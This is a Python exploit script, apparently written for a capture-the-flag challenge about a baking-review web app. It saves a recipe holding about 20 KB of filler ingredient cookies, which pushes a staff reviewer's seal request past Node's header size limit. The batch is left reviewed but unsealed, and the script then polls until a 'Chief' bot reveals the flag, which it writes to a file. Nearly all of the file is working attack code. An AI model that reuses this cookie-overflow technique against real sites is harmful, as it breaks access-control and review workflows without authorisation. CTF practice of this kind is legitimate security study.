#!/usr/bin/env python3
"""Overflow the inspector's own seal request, then wait for a second reviewer.

mixer.js writes one cookie per ingredient inside the staff browser that loads
/review/<id>, and only then POSTs /api/seal with that browser's credentials. Node refuses
request headers over --max-http-header-size (16 KB), so a batch carrying ~20 KB of
ingredient cookies is *reviewed* but never *sealed* - the previous run measured that
(11 KB sealed fine, 17 KB left the batch unsealed) and stopped there, concluding the
duplicate-cookie trick is useless. It never asked what happens to a batch stuck in the
reviewed-but-unsealed state, which is exactly the kind of work a "very busy" Chief
robot would pick up.

Ingredient limit is 300 and values are unrestricted in length, so 100 x 200 chars gives
~20.7 KB of cookies: over the header budget but well inside the app's own validation.

Writes progress to files/escalate.log line by line.
"""
import re
import sys
import time

from cc import new_baker, save, submit

OVERFLOW = [{"name": "zzfill%03d" % i, "value": "x" * 200} for i in range(100)]
SMALL = [{"name": "flour", "value": "2 cups"}, {"name": "moon_sugar", "value": "1"}]
WATCH_MIN = int(sys.argv[1]) if len(sys.argv) > 1 else 200
POLL_S = 100


def cookie_bytes(ings):
    return sum(len(i["name"]) + len(i["value"]) + 2 for i in ings)


def state(c, rid):
    code, page, dt = c.get("/review/%s" % rid)
    txt = page if isinstance(page, str) else str(page)
    seal = re.findall(r"(?i)gold(en)? seal|chief seal|\bchief\b", txt)
    return {
        "status": (re.findall(r"queued|reviewing|reviewed|draft", txt) or ["?"])[-1],
        "gold": bool(re.search(r"(?i)golden|GOLDEN SEAL", txt)),
        "standard": bool(re.search(r"(?i)standard", txt)),
        "chiefword": bool(seal),
        "flag": re.findall(r"sun\{[^{}\r\n]{1,160}\}", txt),
    }


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def submit_until_queued(c, rid, tries=90, gap=20):
    """The API answers 429 'inspector is busy' while a batch is being processed, and a
    rejected submit leaves the recipe in `draft`, so the overflow batch must be retried
    until it is actually queued or the experiment watches nothing."""
    for i in range(tries):
        code, out, dt = submit(c, rid)
        if isinstance(out, dict) and out.get("ok"):
            log("submitted %s after %d tries" % (rid[:8], i + 1))
            return True
        time.sleep(gap)
    log("could not queue %s" % rid[:8])
    return False


u, c, r = new_baker("es")
log("user", u)
_, a, _ = save(c, "control small", SMALL)
_, b, _ = save(c, "overflow 20K", OVERFLOW)
aid, bid = a["id"], b["id"]
log("A=%s %dB cookies | B=%s %dB cookies" % (aid, cookie_bytes(SMALL), bid, cookie_bytes(OVERFLOW)))
submit_until_queued(c, aid)
submit_until_queued(c, bid)

t0 = time.time()
seen = {}
while time.time() - t0 < WATCH_MIN * 60:
    time.sleep(POLL_S)
    for tag, rid in (("A", aid), ("B", bid)):
        st = state(c, rid)
        sig = (st["status"], st["standard"], st["gold"], st["chiefword"])
        if seen.get(tag) != sig:
            log("%dm %-2s %s" % (int((time.time() - t0) / 60), tag, st))
            seen[tag] = sig
        if st["flag"]:
            open("../flag.txt", "w", encoding="utf-8").write(st["flag"][0] + "\n")
            log("!!! FLAG via %s: %s" % (tag, st["flag"][0]))
            sys.exit(0)
log("no golden seal after %d min; A=%s B=%s" % (WATCH_MIN, seen.get("A"), seen.get("B")))
